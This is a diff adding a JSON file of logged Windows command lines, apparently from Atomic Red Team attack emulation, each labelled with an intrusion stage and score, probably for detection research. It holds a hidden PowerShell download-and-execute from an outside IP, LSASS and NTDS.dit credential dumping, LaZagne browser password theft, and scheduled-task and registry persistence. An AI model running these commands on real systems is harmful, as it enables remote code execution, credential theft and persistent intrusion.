@@ -1,0 +1,1035 @@
+[
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  powershell.exe -nop -w hidden -c / IEX ((new-object net.webclient).downloadstring(&apos;http://124.223.85.207:8082/a&apos;))/",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "764fca56fee5525bd098ae311e073bfb"
+    },
+    {
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "594.2",
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/yajshw1q/yajshw1q.cmdline",
+        "raw_cmd": "csc",
+        "id": "4555f43390fe3494a3d527567cdac02b"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "594.2",
+        "cmd": "",
+        "raw_cmd": "powershell",
+        "id": "484f2e9e85b7e62dddd465a31198b585"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "445.4",
+        "cmd": "",
+        "raw_cmd": "",
+        "id": "8695f682358e3f7347e30808cd98aea7"
+    },
+    {
+        "cmd": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "label": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "11199f2a180f949f352ddd69be73b2ff"
+    },
+    {
+        "cmd": "cmd.exe /C  rmdir /s /q C:/%HOMEPATH%/Desktop/T1022",
+        "label": "cmd.exe /C  rmdir /s /q C:/%HOMEPATH%/Desktop/T1022",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "133521c54e64440cbfb3778eff26e0be"
+    },
+    {
+        "cmd": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "id": "14ae5c7b5d2a49b933d0546b6706c4f3"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /delete /tn test /f",
+        "label": "cmd.exe /C  schtasks /delete /tn test /f",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "1710c751ea05824c79c8e363a266dbb0"
+    },
+    {
+        "cmd": "cmd.exe /C spolsv.exe",
+        "label": "cmd.exe /C spolsv.exe",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "1bd753c51f02f342b1b9a1945ba4b663"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "2a4aa502707fc6d5da763494941d41b1"
+    },
+    {
+        "cmd": "cmd.exe /C  del /f HookSSLX64.dll",
+        "label": "cmd.exe /C  del /f HookSSLX64.dll",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "2f92f8f70e08b280865f3ee39acaaa4c"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C ./47\u951f\u7686\u8bb9\u62f7\u951f\u65a4\u62f7\u951f\u65a4\u62f7\u951f\u7ede\u7877\u62f7B.ps1",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C ./47\u951f\u7686\u8bb9\u62f7\u951f\u65a4\u62f7\u951f\u65a4\u62f7\u951f\u7ede\u7877\u62f7B.ps1",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "34440609e8131676a064d5623c200f8d"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "3f11106677a3a7783e77278e987ceab0"
+    },
+    {
+        "cmd": "cmd.exe /C  lazagne1.exe browsers",
+        "label": "cmd.exe /C  lazagne1.exe browsers",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "42ad6840731c1259bed1ea9b7a685e32"
+    },
+    {
+        "cmd": "cmd.exe /C  netstat -an",
+        "label": "cmd.exe /C  netstat -an",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "495ae09fb43db72c73a111615fc01a8e"
+    },
+    {
+        "cmd": "cmd.exe /C  wmic computersystem get domain",
+        "label": "cmd.exe /C  wmic computersystem get domain",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "6acf2c7114d0f5859732134d5cd5f182"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  echo test &gt;&gt; test.exe",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "6ea1872984a507282fc609fa9b9a76ca"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  net group / domain admins/  /domain",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "6f4214d38f991b8722648c02d50b675b"
+    },
+    {
+        "cmd": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "id": "7e341a3eb12fb991f2bd57f8a717eca2"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /delete /tn test /f",
+        "label": "cmd.exe /C  schtasks /delete /tn test /f",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "7ede18ffe0067bc42e26056ca4c34ca6"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1003.003",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "7fbf49bfe0c7cde8f5d0f5421c5b18eb"
+    },
+    {
+        "cmd": "cmd.exe /C  cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+        "label": "cmd.exe /C  cscript.exe  /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "88bbdf49a1ba403f839c469fb1ccba4c"
+    },
+    {
+        "cmd": "cmd.exe /C  del /f /s lsass_dump.dmp",
+        "label": "cmd.exe /C  del /f /s lsass_dump.dmp",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "88f104fd7dcad85db4c5c375bf3e30b8"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /delete /tn test /f",
+        "label": "cmd.exe /C  schtasks /delete /tn test /f",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "a8be2c1c6cd2b2f3bb65c043693f10de"
+    },
+    {
+        "cmd": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "label": "\"powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119  \"",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "id": "b58c294d5cce88ecc3c9084ebb7982af"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1119",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "b868af32b977dfa5011d88627c0af145"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C   Start-Process ./T1059.003_script.bat",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "be40b7b24c3f1cfd6679a4b01d056551"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "c3be5dbda1a026a47ca74ea1aa959ed7"
+    },
+    {
+        "cmd": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "label": "powershell.exe -ExecutionPolicy Bypass -C  Invoke-AtomicTest T1134.001 -TestNumbers 1",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "powershell",
+        "id": "dafb9acf62a3c17b609c217b9f6ebafd"
+    },
+    {
+        "cmd": "cmd.exe /C  procdump.exe -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "label": "cmd.exe /C  procdump.exe -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "dbf9c8f04fbcd3ab25545dd5df167f66"
+    },
+    {
+        "cmd": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "label": "cmd.exe /C  netsh advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "e5cd8e40a87cb0b03fda9a027a7337f2"
+    },
+    {
+        "cmd": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "cmd.exe /C  schtasks /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "Establish Foothold",
+        "stage_score": "674.8",
+        "raw_cmd": "cmd",
+        "id": "f999a0390aa6fa88400060562d6893f8"
+    },
+    {
+        "cmd": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "label": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "netsh",
+        "id": "24ebedb2c2f077bb2eeae7a6e6f6f5ca"
+    },
+    {
+        "cmd": "reg  add / HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run/  /v test /t REG_SZ /d / C:/windows/system32/calc.exe/  /f",
+        "label": "reg  add / HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows/CurrentVersion/Policies/Explorer/Run/  /v test /t REG_SZ /d / C:/windows/system32/calc.exe/  /f",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "8.0",
+        "raw_cmd": "reg",
+        "id": "747b302d0a5747497a39d11e41efbf82"
+    },
+    {
+        "cmd": "spolsv.exe",
+        "label": "spolsv.exe",
+        "stage": "Establish Foothold",
+        "stage_score": "7.2",
+        "raw_cmd": "spolsv",
+        "id": "1e2f7d4afdedff6e4e0be8378bf059a2"
+    },
+    {
+        "cmd": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "schtasks",
+        "id": "ee89d7c76d0b239c6790833dabb32534"
+    },
+    {
+        "cmd": "\" C:/WINDOWS/system32/whoami.exe \"",
+        "label": "\" C:/WINDOWS/system32/whoami.exe \"",
+        "stage": "Internal Reconnaissance",
+        "stage_score": "17.0",
+        "id": "30d138bc1a86ec2f75cf69c770a5f2b4"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "568.8",
+        "cmd": "",
+        "raw_cmd": "powershell",
+        "id": "5408eff07b0a3aad30b46c484e5235b2"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "stage": "Establish Foothold",
+        "stage_score": "10.0",
+        "raw_cmd": "HOSTNAME",
+        "id": "890e6feef99c0f65dc2ebbfb309d8320"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rj51a2aa/rj51a2aa.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "b9d4e7f18ee3bf58c00b886bce06c1e7"
+    },
+    {
+        "cmd": "lazagne1.exe  browsers",
+        "label": "lazagne1.exe  browsers",
+        "stage": "Establish Foothold",
+        "stage_score": "131.20000000000002",
+        "raw_cmd": "lazagne1",
+        "id": "bd564e0db1992d4bc0fc7139a4b7d6a9"
+    },
+    {
+        "cmd": "netstat  -an",
+        "label": "netstat  -an",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "NETSTAT",
+        "id": "c2c7e73fd2cd1797ba62fa01ef623e84"
+    },
+    {
+        "cmd": "wmic  computersystem get domain",
+        "label": "wmic  computersystem get domain",
+        "stage": "Establish Foothold",
+        "stage_score": "48.4",
+        "raw_cmd": "WMIC",
+        "id": "fb7c3d30d2ede90d1b60f559145211b8"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/kv5u34xf/kv5u34xf.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "0abc3227fdf5033b0487dbe27132203d"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/net.exe  group  domain admins  /domain",
+        "label": "C:/WINDOWS/system32/net.exe  group  domain admins  /domain",
+        "stage": "Maintain Persistence",
+        "stage_score": "12.0",
+        "raw_cmd": "net",
+        "id": "3637266d9466dfb354c8772ff0f98641"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/rkdbei0g/rkdbei0g.cmdline",
+        "stage": "Maintain Persistence",
+        "stage_score": "12.0",
+        "raw_cmd": "csc",
+        "id": "6c4361384f1f6b011437ceba342ec0d2"
+    },
+    {
+        "cmd": "7z.exe  a -tzip T1022.zip C://Users/Administrator/Desktop/T1022",
+        "label": "7z.exe  a -tzip T1022.zip C://Users/Administrator/Desktop/T1022",
+        "stage": "Establish Foothold",
+        "stage_score": "36.2",
+        "raw_cmd": "7z",
+        "id": "15094515321e9a167576fb6c4f3c433f"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/nruqy5cg/nruqy5cg.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.599999999999994",
+        "raw_cmd": "csc",
+        "id": "08d25a86c839fc0abb3d9d3a488f9383"
+    },
+    {
+        "cmd": "cmd.exe  /c  wmic /node: localhost  shadowcopy call create Volume=C:/",
+        "label": "cmd.exe  /c  wmic /node: localhost  shadowcopy call create Volume=C:/",
+        "stage": "Establish Foothold",
+        "stage_score": "40.0",
+        "raw_cmd": "cmd",
+        "id": "2e92e8d07be2773dc1ba41cbf65916c6"
+    },
+    {
+        "cmd": "cmd.exe  /c  copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/NTDS.dit C:/Windows/Temp/ntds.dit &amp; copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/Windows/Temp/VSC_SYSTEM_HIVE &amp; reg save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+        "label": "cmd.exe  /c  copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/NTDS.dit C:/Windows/Temp/ntds.dit &amp; copy //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/Windows/Temp/VSC_SYSTEM_HIVE &amp; reg save HKLM/SYSTEM C:/Windows/Temp/SYSTEM_HIVE",
+        "stage": "Establish Foothold",
+        "stage_score": "27.0",
+        "raw_cmd": "cmd",
+        "id": "47ea676812bf207d3e3140c251b3ad50"
+    },
+    {
+        "cmd": "cmd.exe  /c  mkdir C:/Windows/Temp/ntds_T1003 &amp; ntdsutil  ac i ntds   ifm   create full C:/Windows/Temp/ntds_T1003  q q",
+        "label": "cmd.exe  /c  mkdir C:/Windows/Temp/ntds_T1003 &amp; ntdsutil  ac i ntds   ifm   create full C:/Windows/Temp/ntds_T1003  q q",
+        "stage": "Establish Foothold",
+        "stage_score": "14.0",
+        "raw_cmd": "cmd",
+        "id": "56d95db60864840b99515d883d2fad41"
+    },
+    {
+        "cmd": "cmd.exe  /c  wmic shadowcopy call create Volume=C:/",
+        "label": "cmd.exe  /c  wmic shadowcopy call create Volume=C:/",
+        "stage": "Establish Foothold",
+        "stage_score": "40.0",
+        "raw_cmd": "cmd",
+        "id": "59bda6cf1918b6b99ace321373b64dd1"
+    },
+    {
+        "cmd": "cmd.exe  /c  vssadmin.exe create shadow /for=C:",
+        "label": "cmd.exe  /c  vssadmin.exe create shadow /for=C:",
+        "stage": "Establish Foothold",
+        "stage_score": "20.0",
+        "raw_cmd": "cmd",
+        "id": "7212353bbcf65925b2443858aeb64e9f"
+    },
+    {
+        "cmd": "cmd.exe  /c  vssadmin.exe create shadow /for=C: &amp; mklink /D C:/Temp/vssstore //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1",
+        "label": "cmd.exe  /c  vssadmin.exe create shadow /for=C: &amp; mklink /D C:/Temp/vssstore //?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1",
+        "stage": "Establish Foothold",
+        "stage_score": "20.0",
+        "raw_cmd": "cmd",
+        "id": "7584717085dba32fe5cb9137cdb5edeb"
+    },
+    {
+        "cmd": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
+        "label": "powershell.exe  &amp; {(gwmi -list win32_shadowcopy).Create(&apos;C:/&apos;,&apos;ClientAccessible&apos;)}",
+        "stage": "Establish Foothold",
+        "stage_score": "554.9999999999999",
+        "raw_cmd": "powershell",
+        "id": "838dfffb7a13305b19bea3a8a072cafd"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "HOSTNAME",
+        "id": "85828e6e0a615491372fdfbe9bf265d6"
+    },
+    {
+        "cmd": "cmd.exe  /c  wmic /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+        "label": "cmd.exe  /c  wmic /node: localhost  process call create  cmd.exe /c esentutl.exe /y /vss c:/windows/ntds/ntds.dit /d c:/ntds.dit",
+        "stage": "Establish Foothold",
+        "stage_score": "41.0",
+        "raw_cmd": "cmd",
+        "id": "d4ee1c99352260eaf83270ab10841e2c"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/whoami.exe",
+        "label": "C:/WINDOWS/system32/whoami.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "whoami",
+        "id": "fea3792f4fb188a54e6ce570b39d1a7e"
+    },
+    {
+        "cmd": "cscript.exe   /e:VBScript.Encode T1059.007.vbs",
+        "label": "cscript.exe   /e:VBScript.Encode T1059.007.vbs",
+        "stage": "Maintain Persistence",
+        "stage_score": "12.4",
+        "raw_cmd": "cscript",
+        "id": "6aa4b847eacd92f5e2c681a0d3c54a03"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "HOSTNAME",
+        "id": "1fe1a5f83688bf8be6eac6970ed08023"
+    },
+    {
+        "cmd": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
+        "label": "powershell.exe  &amp; {Get-Service &gt; $env:TEMP/T1119_1.txt Get-ChildItem Env: &gt; $env:TEMP/T1119_2.txt Get-Process &gt; $env:TEMP/T1119_3.txt}",
+        "stage": "Establish Foothold",
+        "stage_score": "601.8",
+        "raw_cmd": "powershell",
+        "id": "35539842b904d5cea2881cce0f9381a0"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/whoami.exe",
+        "label": "C:/WINDOWS/system32/whoami.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "whoami",
+        "id": "3a38ea5bc9ab701eb594e6309c858583"
+    },
+    {
+        "cmd": "cmd.exe  /c  sc query type=service &gt; %TEMP%/T1119_1.txt &amp; doskey /history &gt; %TEMP%/T1119_2.txt &amp; wmic process list &gt; %TEMP%/T1119_3.txt &amp; tree C:/AtomicRedTeam/atomics &gt; %TEMP%/T1119_4.txt",
+        "label": "cmd.exe  /c  sc query type=service &gt; %TEMP%/T1119_1.txt &amp; doskey /history &gt; %TEMP%/T1119_2.txt &amp; wmic process list &gt; %TEMP%/T1119_3.txt &amp; tree C:/AtomicRedTeam/atomics &gt; %TEMP%/T1119_4.txt",
+        "stage": "Establish Foothold",
+        "stage_score": "47.0",
+        "raw_cmd": "cmd",
+        "id": "461a96301fbef83bf800a37502ec3a31"
+    },
+    {
+        "cmd": "cmd.exe  /c  mkdir %temp%/T1119_command_prompt_collection &gt;nul 2&gt;&amp;1 &amp; dir c: /b /s .docx | findstr /e .docx &amp; for /R c: %f in (*.docx) do copy %f %temp%/T1119_command_prompt_collection",
+        "label": "cmd.exe  /c  mkdir %temp%/T1119_command_prompt_collection &gt;nul 2&gt;&amp;1 &amp; dir c: /b /s .docx | findstr /e .docx &amp; for /R c: %f in (*.docx) do copy %f %temp%/T1119_command_prompt_collection",
+        "stage": "Establish Foothold",
+        "stage_score": "32.0",
+        "raw_cmd": "cmd",
+        "id": "56fe4a0466a3a3b63ab49e9247d2d655"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/ngon5zfo/ngon5zfo.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.400000000000006",
+        "raw_cmd": "csc",
+        "id": "61e7e2b9aebf24de1b03546d553ac07b"
+    },
+    {
+        "cmd": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
+        "label": "powershell.exe  &amp; {New-Item -Path $env:TEMP/T1119_powershell_collection -ItemType Directory -Force | Out-Null Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP/T1119_powershell_collection}}",
+        "stage": "Establish Foothold",
+        "stage_score": "561.8",
+        "raw_cmd": "powershell",
+        "id": "af78bca578b8af6cbb0c48f6982bb3c4"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/cmd.exe /c   C:/Users/Administrator/Desktop/shell/T1059.003_script.bat",
+        "label": "C:/WINDOWS/system32/cmd.exe /c   C:/Users/Administrator/Desktop/shell/T1059.003_script.bat",
+        "stage": "Establish Foothold",
+        "stage_score": "36.2",
+        "raw_cmd": "cmd",
+        "id": "65b6784bf0b757d8dda52d2b7c38db9e"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/fhwdixby/fhwdixby.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "8de52a0399d5f21a4554f7c8fd4be229"
+    },
+    {
+        "cmd": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "Establish Foothold",
+        "stage_score": "10.0",
+        "raw_cmd": "schtasks",
+        "id": "6d7355758464615200f7aa4b8743e16d"
+    },
+    {
+        "label": "",
+        "stage": "Establish Foothold",
+        "stage_score": "575.8",
+        "cmd": "",
+        "raw_cmd": "powershell",
+        "id": "219d2dd9d2ee376588c24c26a711a6af"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "label": "C:/WINDOWS/system32/HOSTNAME.EXE",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "HOSTNAME",
+        "id": "938ad7340a0adb1a721fe365612f77d1"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.cmdline",
+        "label": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/csc.exe  /noconfig /fullpaths @ C:/Users/Administrator/AppData/Local/Temp/b1oyrudp/b1oyrudp.cmdline",
+        "stage": "Establish Foothold",
+        "stage_score": "40.8",
+        "raw_cmd": "csc",
+        "id": "a5679c643be3c5219e9fcd09266480dd"
+    },
+    {
+        "cmd": "C:/WINDOWS/system32/whoami.exe",
+        "label": "C:/WINDOWS/system32/whoami.exe",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "whoami",
+        "id": "afd44319bf7657fc4b7609625710e089"
+    },
+    {
+        "cmd": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "label": "procdump.exe  -accepteula -ma lsass.exe C:/Windows/Temp/lsass_dump.dmp",
+        "stage": "Escalate Privilege",
+        "stage_score": "33.6",
+        "raw_cmd": "procdump",
+        "id": "e1af9edecf8a93ce10c5183a287ed85e"
+    },
+    {
+        "cmd": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "label": "netsh  advfirewall firewall add rule name=/ test/  dir=in protocol=tcp action=allow localport=80",
+        "stage": "Maintain Persistence",
+        "stage_score": "5.0",
+        "raw_cmd": "netsh",
+        "id": "c8fec1ae0c091f3b6c091617ccc35f9b"
+    },
+    {
+        "cmd": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "label": "schtasks  /create /tn test /tr c:/test/1053.005.bat /sc onlogon",
+        "stage": "null",
+        "stage_score": "0",
+        "raw_cmd": "schtasks",
+        "id": "f62f117f72acc2bd9fc55fbf2551d586"
+    },
+    {
+        "cmd": "C:/Windows/Microsoft.NET/Framework64/v4.0.30319/cvtres.exe /NOLOGO /READONLY /MACHINE:IX86  /OUT:C:/Users/ADMINI~1/AppData/Local/Temp/RES9DFD.tmp   c:/Users/Administrator/AppData/Local/Temp/yajshw1q/CSCC27C022EA157424789D83980FB41D195.TMP",
